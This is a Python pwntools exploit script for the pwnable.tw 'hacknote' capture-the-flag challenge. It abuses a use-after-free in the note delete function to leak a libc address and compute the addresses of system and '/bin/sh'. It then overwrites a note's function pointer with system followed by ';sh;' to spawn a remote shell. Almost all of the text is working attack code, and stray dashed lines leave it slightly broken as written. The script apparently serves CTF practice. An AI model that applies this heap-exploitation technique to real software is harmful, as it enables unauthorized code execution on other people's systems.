from pwn import *

#p = process(["./ld-linux.so.2", "./hacknote"], env={"LD_PRELOAD":"./libc_32.so.6"})
p = remote("chall.pwnable.tw", 10102)

elf = ELF("./libc_32.so.6")
'''
struct note{
	void * func  ---malloc
	void * content ---malloc(size control)
}

note[6]

1.add
	store -> heap -no vul
3.print
2.delete -> UAF,double free,overwrite header

'''
#create idx 0
p.sendlineafter("choice :","1")
p.sendlineafter("size :","300")
p.sendafter("Content :",'A'*4)

#create idx 1
p.sendlineafter("choice :","1")
p.sendlineafter("size :","18")
p.sendafter("Content :",'A'*0x18 )

#delete idx 0
p.sendlineafter("choice :","2")
p.sendlineafter("ndex :","0")

#create idx 2
p.sendlineafter("choice :","1")
p.sendlineafter("size :","300")
p.sendafter("Content :",'A'*4)

#print idx
p.sendlineafter("choice :","3")
p.sendlineafter("ndex :","0")

leak = u32(p.recvuntil('\xf7')[-4:])
libc_base = leak - 1771440
system = libc_base + elf.sym['system']
binsh = libc_base + next(elf.search('/bin/sh'))

print hex(leak)
print "[+] libc_base : " + hex(libc_base)
print "[+] system : " + hex(system)
print "[+] binsh : " + hex(binsh)

#create idx 3
p.sendlineafter("choice :","1")
p.sendlineafter("size :","18")
p.sendafter("Content :",'A'*0x18 )

#delete idx 1
p.sendlineafter("choice :","2")
p.sendlineafter("ndex :","1")

#delete idx 3
p.sendlineafter("choice :","2")
p.sendlineafter("ndex :","3")


#create idx 4

p.sendlineafter("choice :","1")
p.sendlineafter("size :","8")

--------------------------
p.sendafter("Content :",p32(system) + ';sh;')
#p.sendafter("Content :",p32(system) + '/bin/sh')
---------------------------

#gdb.attach(p)

p.sendlineafter("choice :","3")
p.sendlineafter("ndex :","1")


p.interactive()


